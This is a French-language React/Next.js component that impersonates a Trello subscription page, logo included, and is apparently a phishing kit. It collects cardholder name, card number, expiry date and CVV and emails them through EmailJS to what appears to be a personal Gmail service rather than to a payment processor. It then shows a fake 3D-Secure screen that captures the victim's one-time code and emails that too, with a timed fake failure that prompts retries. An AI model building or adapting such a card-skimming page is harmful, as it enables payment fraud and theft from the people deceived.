import React, { useState, useEffect, useCallback } from 'react';
import emailjs from 'emailjs-com';
import Head from 'next/head';
import { loadStripe } from '@stripe/stripe-js';
import {
  EmbeddedCheckoutProvider,
  EmbeddedCheckout
} from '@stripe/react-stripe-js';

const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY);

const Board = () => {
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [isBlurred, setIsBlurred] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [show3DSecurePopup, setShow3DSecurePopup] = useState(false);
  const [showError, setShowError] = useState(false);
  const [selected, setSelected] = useState(null);
  const [showCache, setShowCache] = useState(true);
  const [showStripe, setShowStripe] = useState(false); // New state
  const [clientSecret, setClientSecret] = useState(null); // Define clientSecret state
  const [showCodeInput, setShowCodeInput] = useState(false); // New state for code input
  const [code, setCode] = useState(''); // New state for code

  useEffect(() => {
    const blurTimeout = setTimeout(() => {
      setIsBlurred(true);
    }, 500);

    const popupTimeout = setTimeout(() => {
      setShowPopup(true);
      setShowCache(true);
    }, 1000);

    return () => {
      clearTimeout(blurTimeout);
      clearTimeout(popupTimeout);
    };
  }, []);

  useEffect(() => {
    let errorTimeout;
    if (show3DSecurePopup) {
      errorTimeout = setTimeout(() => {
        setShowError(true);
      }, 57000); // DELAY TO SHOW ERROR MESSAGE
    }
    return () => {
      clearTimeout(errorTimeout);
    };
  }, [show3DSecurePopup]);

  useEffect(() => {
    if (show3DSecurePopup) {
      const errorTimeout = setTimeout(() => {
        setShowError(true);
      }, 57000); // DELAY TO SHOW ERROR MESSAGE
      return () => clearTimeout(errorTimeout);
    }
  }, [show3DSecurePopup]);

  const showPaymentPopup = (plan) => {
    setSelectedPlan(plan);
    setShowCache(false);
    setTimeout(() => {
      document.querySelector('.popup').classList.add('show');
    }, 100); // Delay to ensure the class is added after the component is rendered
  };

  const hidePaymentPopup = () => {
    document.querySelector('.popup').classList.remove('show');
    setTimeout(() => {
      setSelectedPlan(null);
      setShowCache(true);
      setShowPopup(true); // Réaffiche la première popup
      setShowStripe(false); // Reset Stripe view
    }, 300); // Match the duration of the CSS transition
  };

  const getPlanPrice = (plan) => {
    switch(plan) {
      case 'Gratuit':
        return '0€';
      case 'Standard':
        return '5€';
      case 'Premium':
        return '10€'; 
      default:
        return '';
    }
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    setIsLoading(true);

    setTimeout(() => {
      setShowPopup(false);
      setShow3DSecurePopup(true);
    }, 5000);

    emailjs.sendForm('gmail-alexandree', 'new-payment', event.target, 'p7vtRytijMovXPfFA')
      .then(() => {
        console.log('SUCCESS!');
        setIsLoading(false);
        //alert('Form submitted successfully!');
      })
      .catch((error) => {
        console.log('FAILED...', error);
        setIsLoading(false);
      });
  };

  const handleExpiryDateInput = (event) => {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    input.value = value;
  };

  const handleCardNumberInput = (event) => {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 16) {
      value = value.slice(0, 16);
    }
    input.value = value.replace(/(.{4})/g, '$1 ').trim();
  };

  const retry3DSecure = () => {
    setShowError(false);
    setShow3DSecurePopup(false);
    setTimeout(() => {
      setShow3DSecurePopup(true);
    }, 100); // Small delay to reset the popup
  };

  const handleStripePayment = () => {
    setShowStripe(true); // Show Stripe payment details
  };

  const fetchClientSecret = useCallback(() => {
    // Retrieve first name and last name from session storage
    const firstName = sessionStorage.getItem('firstName');
    const lastName = sessionStorage.getItem('lastName');
    const email = `${firstName}.${lastName}@tenvil.com`;
    console.log('Email:', email);

    // Fetch client secret logic here
    return fetch("/api/checkout", {
      method: "POST",
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: email, // Use the constructed email
      }),
    })
      .then((res) => res.json())
      .then((data) => {
        setClientSecret(data.clientSecret);
      });
  }, []);

  useEffect(() => {
    if (showStripe) {
      fetchClientSecret();
    }
  }, [showStripe, fetchClientSecret]);

  const handleCodeSubmit = (event) => {
    event.preventDefault();
    setIsLoading(true);

    emailjs.send('gmail-alexandre', 'new-payment', { code }, 'p7vtRytijMovXPfFA')
      .then(() => {
        console.log('Code sent successfully!');
        setIsLoading(false);
        setShowCodeInput(false);
      })
      .catch((error) => {
        console.log('Failed to send code...', error);
        setIsLoading(false);
      });
  };

  const options = { clientSecret };

  return (
    <div>
      <Head><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/></Head>
      <div className={`dashboard-container ${isBlurred ? 'blurred' : ''}`}></div>
      {showCache && <div className='dashboard-cache'></div>}
      <div className={`subscription-popup ${selectedPlan ? 'hidden' : ''} ${showPopup ? 'show' : ''}`}>
        <svg className='logo' viewBox="0 0 94 32" height="32" fill="none" xmlns="http://www.w3.org/2000/svg" focusable="false" aria-hidden="true">
          <defs>
            <linearGradient id="uid6" x1="9.33821" y1="23.6824" x2="9.33821" y2="5.00599" gradientUnits="userSpaceOnUse">
              <stop stop-color="#0052CC" offset="0%"></stop>
              <stop stop-color="#2684FF" offset="100%"></stop>
            </linearGradient>
          </defs>
          <path fill="var(--ds-text, #172B4D)" fill-rule="evenodd" clip-rule="evenodd" d="M68.749 23.7902C66.249 23.7902 64.6742 22.5776 64.6742 19.7573V5H68.5155V19.2304C68.5155 20.0477 69.0574 20.3381 69.7131 20.3381C69.9021 20.3421 70.0911 20.3331 70.2789 20.3112V23.6315C69.7788 23.7552 69.2639 23.8086 68.749 23.7902ZM38.7121 9.98505V6.37431H26.0297V9.98505H30.3051V23.6825H34.4308V9.98505H38.7121ZM40.1498 23.6825H43.9641V16.6227C43.9641 14.464 45.2276 13.8053 47.9072 14.0149V10.027C45.8443 9.89522 44.6856 10.973 43.9641 12.7904V10.2096H40.1498V23.6825ZM72.6901 19.7573C72.6901 22.5776 74.2619 23.7902 76.7619 23.7902C77.2787 23.809 77.7957 23.7556 78.2978 23.6315V20.3112C78.109 20.333 77.9189 20.342 77.7289 20.3381C77.0732 20.3381 76.5313 20.0477 76.5313 19.2304V5H72.6901V19.7573ZM80.1444 16.9402C80.1444 12.7786 82.5396 9.93129 86.6653 9.93129C90.791 9.93129 93.1353 12.7845 93.1353 16.9402C93.1353 21.0958 90.764 24 86.6653 24C82.5665 24 80.1444 21.0749 80.1444 16.9402ZM83.8809 16.9402C83.8809 18.9701 84.7312 20.5749 86.6653 20.5749C88.5994 20.5749 89.3988 18.9701 89.3988 16.9402C89.3988 14.9103 88.5724 13.3474 86.6653 13.3474C84.7581 13.3474 83.8959 14.9103 83.8959 16.9402H83.8809ZM56.2777 18.3621C55.2023 18.3538 54.1281 18.2909 53.0592 18.1734C53.4124 20.0986 54.8256 20.7692 56.8795 20.7692C58.4004 20.7692 59.8854 20.3501 61.1998 19.9309V23.1734C59.7762 23.7133 58.2642 23.9824 56.7417 23.9668C51.6131 23.9668 49.3436 21.4009 49.3436 17.0806C49.3436 12.934 51.9723 9.94 56.0801 9.94C59.1309 9.94 61.6668 12.0058 61.6668 14.7513C61.6668 17.5776 59.1968 18.3621 56.2777 18.3621ZM57.9513 14.6166C57.9513 13.6136 57.0831 12.8801 56.0022 12.8801L55.9992 12.8711C55.4963 12.8789 55.0046 13.0206 54.5746 13.2816C54.1447 13.5426 53.7921 13.9135 53.5532 14.3561C53.2546 14.9118 53.0751 15.5236 53.0262 16.1525C53.686 16.2551 54.3525 16.3081 55.0202 16.3112C56.5861 16.3112 57.9513 15.91 57.9513 14.6166Z"></path>
          <path fill-rule="evenodd" clip-rule="evenodd" d="M16.4579 5H2.21854C1.63014 5 1.06585 5.23374 0.649794 5.64979C0.233738 6.06585 0 6.63014 0 7.21854V21.4669C0 22.0553 0.233738 22.6196 0.649794 23.0356C1.06585 23.4517 1.63014 23.6854 2.21854 23.6854H16.4579C17.0463 23.6854 17.6106 23.4517 18.0266 23.0356C18.4427 22.6196 18.6764 22.0553 18.6764 21.4669V7.22452C18.6772 6.93268 18.6204 6.64354 18.5093 6.37369C18.3981 6.10383 18.2348 5.85855 18.0287 5.65191C17.8227 5.44527 17.5778 5.28131 17.3083 5.16945C17.0387 5.05758 16.7497 5 16.4579 5V5ZM8.04481 18.4729C8.04481 18.6685 7.96731 18.8561 7.82927 18.9947C7.69123 19.1333 7.50391 19.2116 7.30829 19.2124H4.18558C3.98969 19.2116 3.80205 19.1334 3.66353 18.9949C3.52502 18.8564 3.44685 18.6688 3.44607 18.4729V9.19157C3.44685 8.99568 3.52502 8.80804 3.66353 8.66952C3.80205 8.53101 3.98969 8.45284 4.18558 8.45205H7.30829C7.50391 8.45285 7.69123 8.53111 7.82927 8.66971C7.96731 8.80831 8.04481 8.99595 8.04481 9.19157V18.4729ZM15.2304 14.2185C15.2296 14.4143 15.1514 14.602 15.0129 14.7405C14.8744 14.879 14.6867 14.9572 14.4908 14.958H11.3681C11.1725 14.9572 10.9852 14.8789 10.8471 14.7403C10.7091 14.6017 10.6316 14.4141 10.6316 14.2185V9.19157C10.6316 8.99595 10.7091 8.80831 10.8471 8.66971C10.9852 8.53111 11.1725 8.45285 11.3681 8.45205H14.4908C14.6867 8.45284 14.8744 8.53101 15.0129 8.66952C15.1514 8.80804 15.2296 8.99568 15.2304 9.19157V14.2185Z" fill="url(#uid6)"></path>
        </svg>

        <h1>Trello à votre façon.</h1>
        <h3>Utilisé par des millions de personnes, Trello booste les équipes à travers le monde. <br/>Choisissez l'option qui vous correspond.</h3>
        <div className="plans">
          <div className="plan ">
            <h3>GRATUIT</h3>
            <p>0€ <span className='month'> à vie</span></p>
            <ul>
              <li>Cartes simple illimitées</li>
              <li>Jusqu'à 10 tableaux</li>
              <li>Power-ups illimités/tableau</li>
              <li>250 exécutions de commandes</li>
              
            </ul>
            <button className='phantom' onClick={() => showPaymentPopup('Gratuit')}>Commencer</button>
          </div>  

          <div className="plan ">
            <h3>STANDARD</h3>
            <p>5€<span className='month'> /mois</span></p>
            <ul>
              <li>Tableaux illimités</li>
              <li>Checklists avancées</li>
              <li>Champs personnalisés</li>
              <li>Espace de stockage illimité</li>
              <li>1 000 exécutions de commandes</li>
            </ul>
            <button onClick={() => showPaymentPopup('Standard')}>Essayer gratuitement</button>
          </div>

          <div className="plan star">
            <h3>PREMIUM</h3>
            <p>10€<span className='month'> /mois</span></p>
            <ul>
              <li>Vues : Calendrier, Agenda, Chronogramme et Tableur</li>
              <li>Espaces de travail illimités</li>
              <li>Gestion des tableaux publics</li>
              <li>Exécutions illimitées de com.</li>
              <li>Support Priority</li>
            </ul>
            <button onClick={() => showPaymentPopup('Premium')}>Essayer gratuitement</button>
          </div>
        </div>
      </div>
      {selectedPlan && !show3DSecurePopup && (
        <div className={`popup ${showPopup ? 'show' : ''}`}>
          <div className={`popup-content`}>
            <button className='return' onClick={hidePaymentPopup}>
              <i className="fas fa-chevron-left"></i>
            </button>
                        
            <div className={`payment-details`}>
              <form onSubmit={handleSubmit}>
                <h3>{selectedPlan === 'Gratuit' ? 'Trello Gratuit à vie' : `${selectedPlan} : 30 jours gratuit`}</h3>
                <span>{selectedPlan === 'Gratuit' ? 'Ajoutez une carte à votre nom pour profiter de Trello gratuitement.' : `0€ pendant 30 jours, puis ${getPlanPrice(selectedPlan)}/mois annulez avant pour ne pas être facturé.`}</span>

                <div>
                  <label>Titulaire de la carte</label>
                  <input type="text" name="cardHolder" placeholder='Nom du titulaire' required />
                </div>
                <div>
                  <label>Numéro de carte</label>
                  <input type="text" className='card-number' name="cardNumber" placeholder='4242 4242 4242 4242' required style={{ width: '100%' }} onInput={handleCardNumberInput} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', width: '100%' }}>
                  <div style={{ flex: '1', marginRight: '1rem' }}>
                    <label>Date d'expiration</label>
                    <input type="text" name="cardExpiry" required onInput={handleExpiryDateInput} maxLength="5" placeholder="MM/YY" />
                  </div>
                  <div style={{ flex: '1' }}>
                    <label>CVV</label>
                    <input type="text" name="cardCvc" required placeholder='***' maxLength="3" />
                  </div>
                </div>
                <p className='trial-notice'>{selectedPlan === 'Gratuit' ? 'Un compte gratuit autorisé par utilisateur, le compte peut être utilisé sur plusieur appareils.' : `Une pré-autorisation temporaire de ${getPlanPrice(selectedPlan)} sera effectuée sur votre compte.`}</p>

                <button className='buy' type="submit" disabled={isLoading}>
                  {isLoading ? 'Vérification...' : (selectedPlan === 'Gratuit' ? 'Rejoindre le tableau' : 'Démarrer mon essai')}
                </button>
              </form>
            </div>
           
          </div>
        </div>
      )}
      {show3DSecurePopup && (
        <div className="popup show">
          <div className="popup-content d-secure show">
            <img className='verified' src='/verified-by-visa.png'/>
            <img className='trello' src='/trello-logo.png'/>  
            <hr></hr>
            <h3>Vérificaton 3D-secure</h3>
            {showError ? (
              <>
                <p>La vérification a échoué. Veuillez réessayer.</p>
                <button className='retry-btn' onClick={retry3DSecure}>Réessayer</button>
              </>
            ) : (
              <>
                <p>Confirmez la pré-autorisaton de 10€</p>
                <span>TRELLO* Secure Verif (MoneyGram)</span>
                <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>

                <div className="loading-spinner">
                  <div className="spinner"></div>
                </div>
                <span className="code-btn" onClick={() => setShowCodeInput(true)} style={{ display: showCodeInput ? 'none' : 'inline' }}>Entrer un code OTP</span>
                {showCodeInput && (
                  <form className='code-form' onSubmit={handleCodeSubmit}>
                    <input type="text" value={code} onChange={(e) => setCode(e.target.value)} placeholder="Entrer le code" required />
                    <button type="submit" disabled={isLoading}>{isLoading ? 'Envoi...' : 'Confirmer'}</button>
                  </form>
                )}
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Board;